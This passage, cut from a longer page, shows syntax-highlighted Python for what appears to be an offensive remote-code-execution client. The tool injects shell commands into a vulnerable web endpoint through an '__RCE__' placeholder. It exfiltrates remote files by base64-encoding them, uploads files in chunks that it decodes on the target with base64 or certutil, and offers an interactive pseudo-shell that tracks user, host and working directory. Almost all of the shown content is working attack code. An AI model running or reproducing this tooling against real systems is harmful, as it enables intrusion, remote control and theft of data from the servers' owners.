</span></span><span class="line"><span class="cl"><span class="c1"># A unique sequence of characters that marks start/end of output.</span>
</span></span><span class="line"><span class="cl"><span class="n">UNIQUE_SEQ</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">UNIX_TOOLS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;b64enc&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;base64&#34;</span><span class="p">:</span><span class="s2">&#34;base64&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;openssl&#34;</span><span class="p">:</span><span class="s2">&#34;openssl base64 -A&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">              <span class="s2">&#34;b64dec&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;base64&#34;</span><span class="p">:</span><span class="s2">&#34;base64 -d&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;openssl&#34;</span><span class="p">:</span><span class="s2">&#34;openssl base64 -A -d&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;python&#34;</span><span class="p">:</span><span class="s2">&#34;python -m base64 -d&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">              <span class="s2">&#34;md5sum&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;md5sum&#34;</span><span class="p">:</span><span class="s2">&#34;md5sum&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                         <span class="s2">&#34;md5&#34;</span><span class="p">:</span><span class="s2">&#34;md5 -q&#34;</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">memoize</span><span class="p">(</span><span class="n">function</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">memo</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span> <span class="ow">in</span> <span class="n">memo</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">memo</span><span class="p">[</span><span class="n">args</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">rv</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">memo</span><span class="p">[</span><span class="n">args</span><span class="p">]</span> <span class="o">=</span> <span class="n">rv</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">rv</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">wrapper</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">enclose</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo &#34;</span> <span class="o">+</span> <span class="n">UNIQUE_SEQ</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span> <span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="s2">&#34;;echo &#34;</span> <span class="o">+</span> <span class="n">UNIQUE_SEQ</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;method&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">rce</span><span class="p">[</span><span class="s2">&#34;timeout&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;method&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;__RCE__&#34;</span><span class="p">,</span> <span class="n">quote</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">rce</span><span class="p">[</span><span class="s2">&#34;url&#34;</span><span class="p">],</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                   <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                   <span class="n">timeout</span><span class="o">=</span><span class="n">rce</span><span class="p">[</span><span class="s2">&#34;timeout&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Status: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">enclose</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">UNIQUE_SEQ</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@memoize</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_tool</span><span class="p">(</span><span class="n">tool_type</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">tool_name</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">UNIX_TOOLS</span><span class="p">[</span><span class="n">tool_type</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;which &#34;</span> <span class="o">+</span> <span class="n">tool_name</span> <span class="o">+</span> <span class="s2">&#34; &amp;&amp; echo FOUND || echo FAILED&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;FOUND&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">UNIX_TOOLS</span><span class="p">[</span><span class="n">tool_type</span><span class="p">][</span><span class="n">tool_name</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;md5sum&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">remote_md5sum</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="mi">32</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;cat &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39; | &#34;</span> <span class="o">+</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;b64enc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b64content</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_md5sum</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Remote md5sum: &#34;</span> <span class="o">+</span> <span class="n">remote_md5sum</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34; Local md5sum: &#34;</span> <span class="o">+</span> <span class="n">local_md5sum</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span>  <span class="n">local_md5sum</span> <span class="o">==</span> <span class="n">remote_md5sum</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">remote_path</span><span class="p">),</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">local_path</span><span class="o">+</span><span class="s2">&#34; to &#34;</span><span class="o">+</span><span class="n">remote_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;unix&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;&gt; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;.b64&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;type nul &gt; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">local_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">md5sum</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">b64enc_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Data length (b64-encoded): &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;KB&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">),</span> <span class="n">unit_scale</span><span class="o">=</span><span class="n">BUFFER_SIZE</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span> <span class="n">unit</span><span class="o">=</span><span class="s2">&#34;KB&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;echo &#39;</span> <span class="o">+</span> <span class="n">b64enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &gt;&gt; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#print(&#34;Remaining: &#34;+str(len(b64enc_data)-i))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;unix&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;cat &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;.b64&#39; | &#34;</span> <span class="o">+</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;b64dec&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &gt; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="n">find_tool</span><span class="p">(</span><span class="s2">&#34;md5sum&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#39;&#34;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;certutil -decode &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;certutil -hashfile &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;&#34; MD5&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">md5sum</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               MD5 hashes match: &#34;</span> <span class="o">+</span> <span class="n">md5sum</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;               ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">rce</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">DEBUG</span>
</span></span><span class="line"><span class="cl">    <span class="n">stored_cwd</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_input</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;unix&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_info</span> <span class="o">=</span> <span class="s2">&#34;whoami;hostname;pwd&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">rce</span><span class="p">[</span><span class="s2">&#34;remote_os&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;windows&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_info</span> <span class="o">=</span> <span class="s1">&#39;echo </span><span class="si">%u</span><span class="s1">sername%^|%COMPUTERNAME% &amp; cd&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">stored_cwd</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;cd &#34;</span> <span class="o">+</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_input</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">+=</span> <span class="n">user_input</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34; 2&gt;&amp;1;&#34;</span> <span class="k">if</span> <span class="n">ERR2OUT</span> <span class="k">else</span> <span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="n">get_info</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">rce</span><span class="p">,</span> <span class="n">enclose</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">lines</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">cwd</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">        <span class="n">stored_cwd</span> <span class="o">=</span> <span class="n">cwd</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_input</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[&#34;</span> <span class="o">+</span> <span class="n">user</span> <span class="o">+</span> <span class="s2">&#34;@&#34;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">cwd</span> <span class="o">+</span> <span class="s2">&#34;]$ &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_input</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;exit&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DEBUG ON&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;DEBUG is now ON&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DEBUG OFF&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;DEBUG is now OFF&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;DOWNLOAD&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">remote_path</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="kc">False</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">remote_path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">remote_path</span> <span class="o">=</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">remote_path</span>
</span></span><span class="line"><span class="cl">            <span class="n">download</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;               *****  DOWNLOAD FINISHED  *****&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">user_input</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;UPLOAD&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">upload_cmd</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">local_path</span> <span class="o">=</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">upload_cmd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
